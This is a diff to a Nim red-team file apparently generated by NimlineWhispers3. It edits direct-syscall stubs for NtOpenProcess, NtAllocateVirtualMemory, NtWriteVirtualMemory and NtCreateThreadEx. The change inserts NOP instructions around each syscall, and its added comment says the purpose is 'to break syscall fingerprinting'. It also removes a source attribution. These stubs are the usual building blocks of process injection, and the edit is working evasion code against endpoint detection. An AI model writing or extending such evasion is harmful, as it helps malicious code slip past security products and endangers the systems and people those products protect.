@@ -1,10 +1,11 @@
+# Generated via NimlineWhispers3 project by KlezVirus
+# https://github.com/klezVirus/NimlineWhispers3
+# Modified to include some random NOPs to break syscall fingerprinting
+
 {.passC:"-masm=intel".}
 
 {.emit: """
 #pragma once
-
-// Code below is adapted from @modexpblog. Read linked article for more details.
-// https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams
 
 #ifndef SW3_HEADER_H_
 #define SW3_HEADER_H_
@@ -361,7 +362,10 @@ proc NtOpenProcess*(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAt
 	mov r8, [rsp+24]
 	mov r9, [rsp+32]
 	mov r10, rcx
-	syscall                    
+	nop
+	nop
+	syscall
+	nop                    
 	ret
     """
 
@@ -380,7 +384,10 @@ proc NtClose*(Handle: HANDLE): NTSTATUS {.asmNoStackFrame.} =
 	mov r8, [rsp+24]
 	mov r9, [rsp+32]
 	mov r10, rcx
-	syscall                    
+	nop
+	nop
+	syscall
+	nop                    
 	ret
     """
 
@@ -399,7 +406,10 @@ proc NtAllocateVirtualMemory*(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBit
 	mov r8, [rsp+24]
 	mov r9, [rsp+32]
 	mov r10, rcx
-	syscall                    
+	nop
+	nop
+	syscall
+	nop                    
 	ret
     """
 
@@ -418,7 +428,10 @@ proc NtWriteVirtualMemory*(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PV
 	mov r8, [rsp+24]
 	mov r9, [rsp+32]
 	mov r10, rcx
-	syscall                    
+	nop
+	nop
+	syscall
+	nop                    
 	ret
     """
 
@@ -437,7 +450,10 @@ proc NtCreateThreadEx*(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, Object
 	mov r8, [rsp+24]
 	mov r9, [rsp+32]
 	mov r10, rcx
-	syscall                    
+	nop
+	nop
+	syscall
+	nop                    
 	ret
     """
 
